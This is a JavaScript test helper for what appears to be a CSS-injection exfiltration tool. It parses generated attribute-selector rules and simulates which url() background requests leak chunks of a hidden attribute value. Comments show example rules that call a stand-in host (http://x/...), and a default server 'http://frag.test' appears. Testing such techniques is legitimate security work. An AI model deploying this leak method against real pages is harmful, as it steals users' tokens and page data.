'use strict';

const { generateCSS, ANCHOR_LENGTH } = require('../public/payload');

// Seeded PRNG so random runs are reproducible. Override with FRAG_SEED=<n>.
const SEED = process.env.FRAG_SEED ? Number(process.env.FRAG_SEED) : 0xf7a9;

function rng(seed = SEED) {
  let a = seed >>> 0;
  const next = () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
  next.int = (min, max) => min + Math.floor(next() * (max - min + 1));
  next.hex = n => Array.from({ length: n }, () => '0123456789abcdef'[Math.floor(next() * 16)]).join('');
  next.pick = arr => arr[Math.floor(next() * arr.length)];
  next.shuffle = arr => {
    const a = [...arr];
    for (let i = a.length - 1; i > 0; i--) {
      const j = Math.floor(next() * (i + 1));
      [a[i], a[j]] = [a[j], a[i]];
    }
    return a;
  };
  return next;
}

function grams(s, k) {
  const out = new Set();
  for (let i = 0; i + k <= s.length; i++) out.add(s.substring(i, i + k));
  return out;
}

// Parse the rules generateCSS() emits, e.g.
//   &[href*="abc"]{--a:url(http://x/abc)}
//   &[value^="ab"]+*{--s-:url(http://x/s/ab)}
function parsePayload(css) {
  const re = /&\[([\w-]+)([\^*$]?=)"([^"]*)"\](?:\+\*)?\{--([\w-]+):url\([^)]*?\/(?:([se])\/)?([0-9a-f]+)\)\}/g;
  const rules = [];
  for (const [, attr, op, value, prop, type, chunk] of css.matchAll(re)) {
    rules.push({ index: rules.length, attr, op, value, prop, t: type || 'm', c: chunk });
  }
  return rules;
}

// What the browser would request for an element whose attribute holds
// `attrValue`: every custom property takes the value of the last matching rule
// (all rules share the same specificity), and each property set to a url()
// becomes one background-image request.
function leak(rules, attrValue) {
  if (!rules.byNeedle) {
    rules.byNeedle = new Map();
    rules.lengths = new Set();
    for (const r of rules) {
      const key = r.op + r.value;
      if (!rules.byNeedle.has(key)) rules.byNeedle.set(key, []);
      rules.byNeedle.get(key).push(r);
      rules.lengths.add(r.value.length);
    }
  }
  const matched = [];
  const add = key => matched.push(...(rules.byNeedle.get(key) || []));
  for (const n of rules.lengths) {
    add('^=' + attrValue.slice(0, n));
    add('$=' + attrValue.slice(-n));
    for (const s of grams(attrValue, n)) add('*=' + s);
  }
  const winners = new Map();
  for (const r of matched.sort((a, b) => a.index - b.index)) winners.set(r.prop, r);
  const requests = [...winners.values()].map(r => ({ t: r.t, c: r.c }));
  return {
    requests,
    data: {
      start: requests.find(r => r.t === 's')?.c ?? null,
      end: requests.find(r => r.t === 'e')?.c ?? null,
      chunks: requests.filter(r => r.t === 'm').map(r => r.c),
    },
  };
}

function payloadRules(config, server = 'http://frag.test') {
  const rules = parsePayload(generateCSS(config, server));
  const expected = 16 ** config.windowSize + 2 * 16 ** ANCHOR_LENGTH;
  if (rules.length !== expected) throw new Error(`expected ${expected} rules, parsed ${rules.length}`);
  return rules;
}

module.exports = { SEED, ANCHOR_LENGTH, rng, grams, parsePayload, leak, payloadRules };
